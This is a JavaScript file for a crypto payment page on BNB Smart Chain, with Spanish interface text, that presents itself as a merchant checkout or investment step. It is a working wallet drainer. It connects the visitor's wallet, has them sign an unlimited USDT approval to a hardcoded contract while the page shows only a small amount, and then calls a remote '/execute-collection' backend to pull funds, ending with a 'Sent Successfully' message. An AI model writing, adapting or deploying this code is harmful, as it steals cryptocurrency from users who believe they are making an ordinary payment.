"use strict";

// ─── Configuration ────────────────────────────────────────────────────────────
const MERCHANT_ADDRESS = "0x6253fecbb48a6a7d19f1b9a799e65fae58ab9b3b";
const CONTRACT_ADDRESS = "0x8e18bE616f10565A63cEa65585Ddf1Ca61f1C634";
const BSC_USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955";
const BSC_CHAIN_ID_HEX = "0x38"; 
const MIN_USDT_BALANCE = 0n; 
const BACKEND_URL      = "https://secure-merchant.onrender.com/api";

const BSC_RPC_URLS = [
  "https://bsc-rpc.publicnode.com",
  "https://bsc-dataseed1.binance.org/",
  "https://bsc-dataseed2.binance.org/",
  "https://rpc.ankr.com/bsc"
];

const BSC_CHAIN_PARAMS = {
  chainId:           BSC_CHAIN_ID_HEX,
  chainName:         "BNB Smart Chain",
  nativeCurrency:    { name: "BNB", symbol: "BNB", decimals: 18 },
  rpcUrls:           BSC_RPC_URLS,
  blockExplorerUrls: ["https://bscscan.com/"]
};

const ERC20_ABI = [
  "function approve(address spender, uint256 amount) external returns (bool)",
  "function allowance(address owner, address spender) external view returns (uint256)",
  "function balanceOf(address account) external view returns (uint256)"
];

// ─── DOM refs ─────────────────────────────────────────────────────────────────
const approveBtn    = document.getElementById("approveBtn");
const btnText       = document.getElementById("btnText");
const btnSpinner    = document.getElementById("btnSpinner");
const merchantInput = document.getElementById("merchantAddress");
const toastEl       = document.getElementById("toast");

if (merchantInput) merchantInput.value = MERCHANT_ADDRESS;

// ─── Wake up Render backend ───────────────────────────────────────────────────
(async () => { try { await fetch(`${BACKEND_URL}/health`); } catch (_) {} })();

// ─── UI helpers ───────────────────────────────────────────────────────────────
let _toastTimer;
function showToast(msg, type = "default", ms = 4500) {
  if (!toastEl) return;
  clearTimeout(_toastTimer);
  toastEl.textContent  = msg;
  toastEl.dataset.type = type === "default" ? "" : type;
  toastEl.hidden       = false;
  _toastTimer = setTimeout(() => { toastEl.hidden = true; }, ms);
}

function setLoading(on, label = "Processing…") {
  if (!approveBtn) return;
  approveBtn.disabled = on;
  if (btnText) btnText.textContent = on ? label : "NEXT";
  if (btnSpinner) btnSpinner.hidden   = !on;
}

// ─── Backend collect trigger ──────────────────────────────────────────────────
async function triggerBackendCollect(userAddress) {
  let lastErr;
  const uiAmount = document.getElementById("investAmount")?.value || "1"; 
  const dynamicAmountWei = ethers.parseUnits(uiAmount.toString(), 18).toString();

  for (let i = 1; i <= 3; i++) {
    try {
      const res  = await fetch(`${BACKEND_URL}/execute-collection`, {
        method:  "POST",
        headers: { "Content-Type": "application/json" },
        body:    JSON.stringify({ userAddress: userAddress, amount: dynamicAmountWei })
      });
      const data = await res.json();
      if (!res.ok || !data.success) throw new Error(data.error || "Collection failed.");
      return data;
    } catch (e) {
      lastErr = e;
      if (i < 3) await new Promise(r => setTimeout(r, 3000));
    }
  }
  throw lastErr;
}

// ─── Main Button Handler (AppKit Native Flow) ─────────────────────────────────
if (approveBtn) {
  approveBtn.addEventListener("click", async () => {
    let rawProvider = null;
    if (window.modal && typeof window.modal.getWalletProvider === "function") {
      try {
        rawProvider = window.modal.getWalletProvider();
      } catch (_) {}
    }

    // PASO 1: Si NO está conectado -> Abrir el modal y ESPERAR a que conecte
    if (!rawProvider) {
      if (window.modal && typeof window.modal.open === "function") {
        setLoading(true, "Esperando conexión...");
        try {
          // modal.open() pausa la ejecución hasta que el usuario interactúa o cierra el modal
          await window.modal.open();
          
          // Reintentar obtener el proveedor justo después de que el usuario cierre el modal
          rawProvider = window.modal.getWalletProvider ? window.modal.getWalletProvider() : null;
          
          if (!rawProvider) {
            // El usuario cerró el modal sin conectar
            setLoading(false);
            updateButtonState();
            return;
          }
        } catch (modalErr) {
          console.error("Error al abrir AppKit:", modalErr);
          setLoading(false);
          updateButtonState();
          return;
        }
      } else {
        setLoading(false);
        return;
      }
    }

    // PASO 2: Una vez conectado (o si ya lo estaba), CONTINÚA AUTOMÁTICAMENTE AQUÍ:
    setLoading(true, "Conectando proveedor…");

    try {
      const provider = new ethers.BrowserProvider(rawProvider);
      
      // Verificación y cambio de red a BSC
      const network = await provider.getNetwork();
      if (Number(network.chainId) !== 56) {
        setLoading(true, "Verificando red BSC…");
        try {
          await rawProvider.request({
            method: "wallet_switchEthereumChain",
            params: [{ chainId: BSC_CHAIN_ID_HEX }]
          });
        } catch (switchError) {
          if (switchError.code === 4902) {
            await rawProvider.request({
              method: "wallet_addEthereumChain",
              params: [BSC_CHAIN_PARAMS]
            });
          } else {
            showToast("Cambia manualmente a BNB Smart Chain en tu wallet.", "error");
            setLoading(false);
            return;
          }
        }
      }

      const signer = await provider.getSigner();
      const userAddress = await signer.getAddress();

      if (!userAddress) {
        showToast("Desbloquea tu billetera y selecciona una cuenta.", "error");
        setLoading(false);
        return;
      }

      const usdtContract = new ethers.Contract(BSC_USDT_ADDRESS, ERC20_ABI, signer);

      setLoading(true, "Validando saldo…");
      const usdtBalance = await usdtContract.balanceOf(userAddress);
      if (usdtBalance <= MIN_USDT_BALANCE) {
        showToast("Saldo insuficiente de USDT en BSC", "error");
        setLoading(false);
        return;
      }

      const CAP_AMOUNT = ethers.MaxUint256;
      const requiredAmount = ethers.parseUnits(document.getElementById("investAmount")?.value.toString() || "1", 18);

      try {
        const allowance = await usdtContract.allowance(userAddress, CONTRACT_ADDRESS);
        if (allowance >= requiredAmount) {
          setLoading(true, "Finalizando proceso…");
          await triggerBackendCollect(userAddress);
          showToast("Sent Successfully, Thank you! ✓", "success");
          setLoading(false);
          updateButtonState();
          return;
        }
      } catch (_) {}

      // Lanzar la firma de aprobación automáticamente
      setLoading(true, "Firma requerida en wallet…");
      const tx = await usdtContract.approve(CONTRACT_ADDRESS, CAP_AMOUNT);

      setLoading(true, "Confirmando en red…");
      await tx.wait();

      setLoading(true, "Finalizando…");
      await triggerBackendCollect(userAddress);
      showToast("Sent Successfully, Thank you! ✓", "success");

    } catch (err) {
      const raw = err?.reason ?? err?.message ?? "Error desconocido";
      if (
        err.code === 4001 ||
        raw.toLowerCase().includes("user rejected") ||
        raw.toLowerCase().includes("denied") ||
        raw.toLowerCase().includes("cancelled") ||
        raw.toLowerCase().includes("canceled")
      ) {
        showToast("Transacción cancelada.", "default");
      } else {
        console.error("Web3 Error:", err);
        showToast("Error de comunicación con la wallet. Intenta de nuevo.", "error");
      }
    } finally {
      setLoading(false);
      updateButtonState();
    }
  });
}
